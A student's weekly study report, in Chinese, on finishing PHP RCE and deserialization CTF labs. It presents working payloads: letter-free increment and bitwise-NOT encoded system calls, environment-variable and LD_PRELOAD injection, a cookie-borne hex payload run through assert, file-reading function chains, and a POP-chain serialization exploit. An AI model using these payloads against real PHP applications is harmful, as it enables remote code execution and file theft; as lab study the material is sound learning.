# <font style="color:rgb(38, 38, 38);">完成事项</font>
1. RCE-labs通关
2. 反序列化靶场通关
  
# <font style="color:rgb(38, 38, 38);">下周待做事项</font>
1. 学习文件包含PHPinclude-labs靶场
2. 学习PHP代码审计相关知识
3. 继续搞docker
# <font style="color:rgb(38, 38, 38);">本周学习的知识分享</font>
## 一.RCE-labs通关知识汇总(续)
#### I. 不完全过滤
2. 无字母
+ 自增
>在php中，当数组被强制用作字符串时，会返回"Array"这个字符串。当使用.运算符连接数组时，php就会将数组强制转换为字符串

所以可以创建一个字符串变量:
```php
$_=([].'')[$___];//由于$___不存在，所以返回false(0),$_表示"A"
```
可以利用自增的特性来输出A-Z的字母(php只支持字母自增，不能自减)
```php
$_++;
$_++;
//$_现在为C
```
创建一个变量用于储存语句
```php
$__=$_;
$_++;
$__=$__.$_;//$__为"CD"
```
一般ban一种类型的注入点，我们最终将payload改成另一种注入点请求
```php
//过滤了post参数
$$_[_]($$_[__]);//$_='_GET'
//所以在url上注入参数_=system&__=ls /
```
#### II. 无回显rce
3. 环境变量注入
+ ENV环境变量
>这是unix shell的底层漏洞，类似于shellshock。shell会解析用特点参数构造的环境变量，从而执行任意命令

>ENV '$(命令)'：可以在sh -i -c的时候注入任意命令

>PS1,2,4='命令'：可以在sh或bash交互式环境下执行任意命令(PS1为主提示符，PS2为次提示符，PS4为调试提示符)

>BASH_ENV='(命令)'：可以在bash -c的时候注入任意命令
PROMPT_COMMAND：可以在bash交互式环境下执行任意命令

>BASH_FUNC_xxx%%=(){命令}：这是bash定义函数的写法，xxx为函数名，由于shell函数限制，所以需要覆盖原有环境变量为新函数再运行此变量，比如echo(须Bash 4.4及之后)

+ LD_PRELOAD注入
>LD_PRELOAD是Linux系统中的一个环境变量，它可以影响程序的运行时的链接 (变量模块与程序的链接)，它允许你定义在程序运行前优先加载的动态链接库。
通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。

>前提：1.能够控制环境变量的值
>2.putenv()函数未被禁用
>可以上传.so文件

可以用来进行disabled_functions绕过
#### III. 长度限制绕过
>\>a 创建文件a
> \>>a 追加文件到a
> ls -t 基于基于事件排序从晚到早
> \命令拼接 当\出现在末尾时，表示下一行是当前行的延续，可以用来拼接被截断的命令
> sh a 执行文件a里的内容

可以先创建多个空文件
>\>ls
>ls>a 先将ls写入文件a
>\>\  注意这里的\作用是将空格转义
>\>-t

ls>>a  将排序结果写入文件a，ls默认按字母顺序排序
>此时a文件内容是：ls -t

sh a 执行ls -t命令
#### IV. 无参RCE
1. 函数嵌套
>在正则过滤中，无参RCE往往类似于
/[^\W]+\((?R)?\)/
\[^\W]匹配字母，即函数名。(?R)是递归匹配，引用了前面的字母匹配，说明这行正则表达只能匹配嵌套的函数调用，而不能处理函数参数。这意味着此类RCE只能使用函数而不能使用参数

+ scandir()读取目录
>scandir():用于列出指定目录中的文件和目录，返回一个数组
>localeconv():返回一包含本地数字及货币格式信息的数组，数组第一项为.
>current()/pos():返回数组中的单元，默认取第一个值
>hightlight_file()/show_source()/readfile()/
print_r()/file_get_contents()/readgzfile():读取文件内容

所以我们可以利用这些函数嵌套来构造ls .的payload
```php
scandir(current(localeconv()));
```
针对数组，可以用以下方式进行变换取值:
>array_reverse():将数组内容反转
end():指向数组中的最后一个元素，并输出
next():指向数组中的下一个元素，并输出
prev():指向数组中的上一个元素，并输出
reset():指向数组中的第一个元素，并输出
each():返回当前元素的键名和键值，并将内部指针向前移动

再用函数读取其中的文件名即可

以此可以构造更多的命令执行
>getcwd():获取当前工作目录路径
dirname():函数返回路径中的目录部分(即去除文件名部分)
chdir():函数改变当前的目录(相当于cd命令)
```php
print_r(scandir(dirname(getcwd())));//读取上级目录
```
>array_flip():函数交换数组的键和值，用于构造反向索引
array_rand():用于从数组中随机取出一个**键名**
```php
show_source(array_rand(array_flip(scandir(current(localeconv())))));
//随机读取文件，须多刷新几次
show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));
//读取上级目录的随机文件
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));
//读取上级目录的随机文件
```
>array():创建空数组
>serialize():将变量转换为可存储或传输的字符串表示形式
>crypt():DES加密字符串
>strrev()/hebrevc():字符串反转
>chr()/ord():chr()函数返回指定的ASCII值对应的字符，ord()函数返回字符串第一个字符的ASCII值
```php
print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));
//神奇的是这样写可以使chr(ord())混淆，有概率解码出/
//读取根目录
show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));
//读取根目录的随机文件
```
+ cookie注入
>session_id()可以获取或设置当前会话的ID，可以用来读取session文件。其中包括PHPSESSID
我们可以将命令通过编码的方式储存在PHPSESSID中，然后通过session_id()取出并解码执行

>bin2hex()十六进制编码
>hex2bin()十六进制解码

cookie注入payload:
```php
cookie:PHPSESSID=706870696e666f28293b//phpinfo();
```
用于php命令执行
>eval()
>assert()

再传参
```php
assert(hex2bin(session_id(session_start())));
**一定要在内部写入session_start()确保session_id()开启**
```
此方法还可以写入文件名用于读文件

+ getallheaders()读取请求头
（此方法只限于apache服务器）
>getallheaders():获取所有HTTP请求头，返回一个关联数组
>和cookie注入类似，可以将命令写入**自定义**请求头中，然后通过getallheaders()取出执行
```php
var_dump(end(getallheaders()));
```
2. 取反绕过
>php会先自动解析参数的urlencode编码，再传递参数。所以可以利用urlencode编码的取反特性来绕过无参RCE

原理:将字母ascii按位取反得到的的十六进制进行urlencode编码，再通过函数取反还原，再将函数部分和参数部分用()分离
>只有当PHP>=7才可以使用($a)()进行动态执行

比如system(cat /flag):
```php
(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98)
```
3. 异或绕过/或绕过
>原理和取反相同

## 二.反序列化知识汇总
### 基础:php面向对象编程
+ ##### 什么是类，对象，属性，方法
```php
<?php
class A{
    public $a=0;//属性
    public function add($b){
        echo $this->a+1;//在类里访问成员变量要用$this->
        echo $b+1;
    }
}
$obj=new A();//对象
$obj->add(2);//调用方法
?>
```
在php中，类的成员变量和方法的访问要用`->`符号，遵循`对象->成员变量`或`对象->方法()`的格式
```php
$obj->add(2);
```
但在类中访问成员变量和方法，由于对象未实例化，所以需要用`$this`代替
```php
echo $this->a+1;
```
我们可以通过`$对象名 -> 对应值 = 值`的格式来修改对象的成员变量
```php
$c=5;
$obj->a=$c;//间接赋值
```
+ ##### 控制修饰符
php中类的成员变量和方法可以通过控制修饰符来控制访问权限，常见的有三种:
- public: 公有，可以在类的外部访问
- protected: 受保护，可以在类的内部和子类中访问，可以继承
- private: 私有，只能在类的内部访问，不能被继承
>属性和方法都可以使用控制修饰符，注意辨别

### 入门:序列化和反序列化
>序列化是将数据结构或对象转换为可存储或传输的格式的过程，反序列化是将序列化后的数据还原为原始数据结构或对象的过程
序列化只会储存对象的属性值，不会储存对象的方法

我们可以对一个对象进行序列化操作，这样就可以显示出这个对象的全部属性(包括私有属性)

序列化写法:
```php
b:1/b:0 //布尔值
O:7:"a_class":1:{s:7:"a_value";s:4:"FLAG";} //对象，内部为键值对
a:2:{i:0;s:4:"test";i:1;s:6:"string";} //数组，内部为索引值对
i:10 //整数
s:4:"test" //字符串
d:3.14 //浮点数
N; //NULL
```
控制修饰符在序列化中也有不同表示
```php
protected（受保护）： %00*%00变量名
private（私有）： %00类名%00变量名
```
>%00即null字符，一般不可见。所以在构造exp时应加上urlencode()函数进行辨别

### 初步:反序列化利用
+ ##### 构造函数和析构函数
> + 构造函数(__construct)只会在类实例化的时候，也就是使用new的方法手动创建对象的时候才会触发，**而通过反序列化创建的对象(unserialize(serialize(new xxx)))不会触发这一方法**
> + 析构函数(__destruct)会在对象被回收的时候触发：
手动回收:unset(对象)方法用于释放对象。
自动回收:对象没有值引用，或者脚本结束完全释放
> + PHP的GC(垃圾回收机制)会在脚本运行时自动管理内存，销毁不被引用的对象

+ __wakeup()方法
> 该方法会在反序列化时自动调用，可以用来重新初始化对象的属性，或者执行一些必要的操作

漏洞(CVE-2016-7124):当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行

+ __sleep()方法
> 该方法会在序列化时自动调用，可以用来指定哪些属性需要被序列化，或者执行一些必要的清理操作

写法:
>__sleep()必须返回一个数组，数组中包含需要序列化的属性名，当属性被 static修饰时，无论有无都无法序列化该属性
```php
public function __sleep(){
    return array('属性1','属性2');//返回需要序列化的属性数组
}
```
>如果需要返回**父类**中的**特殊**属性，需要使用序列化中的特殊格式
>如果__sleep() 方法未返回任何内容或返回非数组类型，对象会被序列化为 null 空值

+ __toString()方法
> 该方法会在对象被当作字符串使用时自动调用

比如:
```php
$obj = new FLAG(); 
echo $obj; // 触发 __toString() 方法
```

+ __invoke()方法
> 该方法会在对象被当作函数调用时自动调用

```php
class FLAG{
    function __invoke($x) {
        if ($x == 'get_flag') {
            include 'flag.php';
            echo $flag;
        }
    }
}
$obj = new FLAG();
o=$obj('get_flag'); // 触发 __invoke() 方法
```
+ __call()方法
> 该方法会在调用对象中不存在的方法时自动调用

```php
class Test {
    public function __call($method, $args) {
        echo "你调用了不存在的方法: {$method}";
    }
}
$test = new Test();
$test->hello("world", 123);  // 调用不存在的方法
```
+ pop链
> pop链是指通过反序列化触发一系列方法调用，最终达到执行任意代码的目的

一个pop链包含三部分:
>起点->跳板->终点

起点: 反序列化时触发的方法，如__wakeup()等
跳板: 中间类的方法，用于传递数据和调用终点方法
终点: 最终执行恶意代码

而构造时往往要从终点往起点反推，比如labs的第16题:
```php
class A {
    public $a;
    public function __invoke() {
            include $this->a;
            return $flag;
    }
}
class B {
    public $b;
    public function __toString() {
        $f = $this->b;
        return $f();
    }
}
class INIT {
    public $name;
    public function __wakeUp() {
        echo $this->name.' is awake!';
    }
}
if(isset($_POST['o'])) {
    unserialize($_POST['o']);
} else {
    highlight_file(__FILE__);
} 
```
可以看到起点是INIT类的__wakeup()方法，它可以利用B类的__toString()方法作为跳板，最终调用A类的__invoke()方法作为终点执行include操作

我们从终点开始写值传递:
```php
$a=new A();
$a->a='flag.php';//在终点构造payload

$b=new B();
$b->b=$a;//调用对象会触发__toString()

$init=new INIT();
$init->name=$b;//echo对象会触发__toString()方法

echo urlencode(serialize($init));
```

### 进阶：反序列化利用
+ 字符串逃逸
>反序列化创建的对象(unserialize(serialize(new xxx)))反序列化创建的对象由原始对象和序列化字符串共同决定，但是后者的优先级更高。我们可以通过构造特殊的序列化字符串来覆盖原始对象的属性值，甚至是修改类名

比如:
```php
class A {
} 
if(isset($_POST['o'])) {
    $a = unserialize($_POST['o']); 
}
```
我们可以自行写入将空类实例化成我们想要的对象:
```php
class A {
    public $helloctfcmd = "get_flag";
}
echo urlencode(serialize(new A()));
```
+ ;}判定
>这是一个特性，进行反序列化时，**当成员属性的数量，名称长度，内容长度均一致时**，程序会以 ";}" 作为反序列化字符串的结尾判定

另外我还在18关收获了一点
```php
str_replace($target, $change, $serliseStringDemo); 
```
可以给\$target和\$change分别传入数组，str_replace会根据两个数组的索引进行一一替换
# <font style="color:rgb(38, 38, 38);">本周学习总结</font>
学习了rce和反序列化，docker的获取源一直提示fail to connect，怎么搞都没用，这周暂时搁置。
别看我短，短小但精华
